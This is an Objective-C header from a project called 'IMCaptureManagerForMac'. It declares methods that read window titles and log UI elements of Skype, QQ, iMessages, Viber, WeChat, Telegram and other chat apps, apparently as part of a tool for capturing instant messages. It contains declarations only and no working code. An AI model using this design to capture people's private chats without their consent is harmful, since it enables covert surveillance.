//
//  IMWindowTitleUtils.h
//  IMCaptureManagerForMac
//
//  Created by Makara Khloth on 2/19/15.
//  Copyright (c) 2015 Makara Khloth. All rights reserved.
//

#import <Foundation/Foundation.h>

@interface IMWindowTitleUtils : NSObject
+ (NSString *) skypeWindowTitle;
+ (NSString *) skypeWindowTitle: (NSNumber *) aWindowID;
+ (NSString *) lineWindowTitle;
+ (NSString *) qqWindowTitle;
+ (NSString *) qqWindowTitle: (NSNumber *) aWindowID;
+ (NSString *) qqWindowTitle4_0_2: (NSNumber *) aWindowID;
+ (NSString *) iMessagesWindowTitle;
+ (NSString *) iMessagesWindowTitle: (NSNumber *) aWindowID;
+ (NSString *) aimWindowTitle;
+ (NSString *) viberWindowTitle;                            // Below 5.0.1
+ (NSString *) viberWindowTitle: (NSNumber *) aWindowID;    // Below 5.0.1
+ (NSString *) viberWindowTitle5_0_1;                           // 5.0.1
+ (NSString *) viberWindowTitle5_0_1: (NSNumber *) aWindowID;   // 5.0.1
+ (NSString *) wechatWindowTitle;
+ (NSString *) trillianWindowTitle;
+ (NSString *) trillianWindowTitle: (NSNumber *) aWindowID;
+ (NSString *) telegramWindowTitle; 
+ (NSString *) telegramWindowTitle: (NSNumber *) aWindowID;
+ (NSString *) telegramDesktopWindowTitle;
+ (NSString *) telegramDesktopWindowTitle: (NSNumber *) aWindowID;
#pragma mark - Debug -


+ (void) logUIElementOfSkype;
+ (void) logUIElementOfLINE;
+ (void) logUIElementOfQQ;
+ (void) logUIElementOfiMessages;
+ (void) logUIElementOfAIM;
+ (void) logUIElementOfViber;       // Below 5.0.1
+ (void) logUIElementOfViber5_0_1;  // 5.0.1
+ (void) logUIElementOfWeChat;
+ (void) logUIElementOfTrillian;
+ (void) logUIElementOfSpotlight;

+ (void) logBundleIDViaPID:(int)aPID;
+ (void) logPIDofWantedProcessName:(NSString *)aName;

@end
